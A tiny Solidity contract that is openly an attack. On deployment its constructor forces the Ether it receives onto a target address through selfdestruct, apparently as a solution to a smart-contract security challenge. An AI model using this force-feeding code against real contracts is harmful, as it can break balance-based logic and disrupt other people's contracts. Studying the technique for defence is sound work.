// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttackerWithErrorCheck {
    constructor(address payable _target) payable {
        require(msg.value > 0, "Deploy with Ether");
        selfdestruct(_target);
    }
}